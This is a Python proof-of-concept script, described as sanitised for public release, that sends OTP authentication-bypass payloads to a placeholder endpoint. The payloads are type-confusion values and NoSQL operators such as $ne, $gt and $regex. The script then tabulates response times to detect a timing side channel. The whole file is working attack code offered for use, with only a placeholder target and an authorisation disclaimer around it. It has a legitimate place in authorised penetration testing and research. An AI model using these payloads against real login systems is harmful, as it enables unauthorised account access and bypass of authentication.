"""
This PoC has been sanitized for public release.
Target-specific and sensitive information has been removed.
Users must provide their own authorized target and request structure.

Functionality:
- Tests OTP type confusion and NoSQL operator payloads.
- Measures response-time differences.
- Calculates average response time and standard deviation.

Vulnerability: OTP Authentication Bypass
Primary CWE: CWE-287
Root Cause: CWE-843
Related CWE: CWE-307, CWE-208

Use only against systems you are authorized to test.
"""

import json
import statistics
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ================= CONFIGURATION =================

# Target URL
TARGET_URL = "<AUTHORIZED_TARGET>"  # CHANGE THIS IF NEEDED

# Request headers
HEADERS = {
    "Content-Type": "application/json",  # CHANGE THIS IF NEEDED
    "User-Agent": "Security-Researcher-PoC/2.0",  # CHANGE THIS IF NEEDED

    # "X-Custom-Header": "<VALUE>",  # CHANGE THIS IF NEEDED
}

# Request body / parameters
BODY_TEMPLATE = {
    "otp": None,  # CHANGE THIS IF NEEDED

    # "email": "<TEST_EMAIL>",  # CHANGE THIS IF NEEDED
}

# Basic payloads
PAYLOADS = [
    "123456",
    "000000",
    True,
    None,
    " ",
    # ADD YOUR PAYLOADS HERE
]

# NoSQL operators
OPERATORS = [
    "$gt",
    "$ne",
    "$eq",
    "$regex",
    # ADD YOUR OPERATORS HERE
]

# Custom payloads
CUSTOM_PAYLOADS = [
    "\x00",
    "１２３４５６",
]

# Requests per payload
NUM_RUNS = 3  # CHANGE THIS IF NEEDED

# Proxy
# PROXIES = {
#     "http": "http://127.0.0.1:8080",
#     "https": "http://127.0.0.1:8080",
# }
PROXIES = None  # CHANGE THIS IF NEEDED

# Request timeout
TIMEOUT = 10  # CHANGE THIS IF NEEDED

# TLS verification
VERIFY_TLS = True  # CHANGE THIS IF NEEDED

# =================================================


def generate_payloads():
    """Generate the payload set used for testing."""

    payloads = list(PAYLOADS)

    for operator in OPERATORS:
        payloads.append({operator: ""})
        payloads.append({operator: "1"})

    payloads.extend(CUSTOM_PAYLOADS)

    return payloads


def build_body(otp_payload):
    """
    Build the request body using the user-defined template.
    """

    body = BODY_TEMPLATE.copy()
    body["otp"] = otp_payload

    return body


def test_payload(otp_payload):
    """Send a payload and measure the response time."""

    body = build_body(otp_payload)

    durations = []
    status = 0

    for _ in range(NUM_RUNS):
        start = time.perf_counter()

        try:
            response = requests.post(
                TARGET_URL,
                headers=HEADERS,
                json=body,
                proxies=PROXIES,
                verify=VERIFY_TLS,
                timeout=TIMEOUT,
            )

            durations.append(time.perf_counter() - start)
            status = response.status_code

        except Exception as exc:
            durations.append(0)
            status = f"ERR: {str(exc)[:15]}"

    if durations and sum(durations) > 0:
        avg_duration = sum(durations) / len(durations)

        std_dev = (
            statistics.stdev(durations)
            if len(durations) > 1
            else 0
        )

        label = str(otp_payload)[:40]

        print(
            f"| {label:<42} | "
            f"{avg_duration:.3f}s | "
            f"±{std_dev:.3f} | "
            f"{status}"
        )


if __name__ == "__main__":
    payloads = generate_payloads()

    print("[*] Starting Side-Channel Analysis")
    print("-" * 85)
    print(
        f"| {'Payload Type / Operator':<42} | "
        f"Avg Time | Std Dev | Status"
    )
    print("-" * 85)

    for payload in payloads:
        test_payload(payload)

    print("-" * 85)
    print("[*] Analysis Completed.")